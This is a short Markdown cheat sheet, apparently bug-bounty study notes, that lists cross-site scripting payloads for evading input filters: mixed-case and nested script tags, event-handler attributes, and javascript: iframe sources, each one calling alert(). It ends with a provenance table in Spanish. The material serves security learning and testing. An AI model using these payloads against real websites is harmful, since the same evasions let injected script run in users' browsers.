# Filter evasion (HackingHub)

## Case sensitive

```html
<ScripT>alert()</script>
```

## Second occurence

```html
<script>alert()</script><script>alert()</script>
```

## Script Tags

```html
<u/onmouseover=alert();//>test
```

## Attributes

```html
<iframe/src=javascript:alert();//>
```

## All tags

```html
<img src=x onerror=alert();
```

```html
<scr<script>ipt>alert()</sc</script>ript>
```

## Procedencia

| Repositorio | Archivo original | Commit de origen |
| --- | --- | --- |
| CBBH | BB/hackinghub/Client side/XSS/Filter evasion.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |

[Índice de categoría](../README.md) · [Inicio](../../README.md)
